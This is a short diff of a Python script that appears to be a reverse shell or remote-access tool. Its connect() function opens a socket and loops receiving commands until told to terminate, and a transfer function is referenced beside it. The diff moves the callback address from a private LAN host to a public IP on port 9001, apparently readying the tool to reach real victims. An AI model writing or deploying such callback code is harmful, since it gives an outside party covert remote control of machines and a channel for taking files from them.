@@ -16,7 +16,7 @@ def transfer(s, path):
 
 def connect():
     s = socket.socket()
-    s.connect(("192.168.1.183",8080))
+    s.connect(("134.209.73.141",9001))
     while True:
         command = s.recv(1024)
         if "terminate" in command.decode():
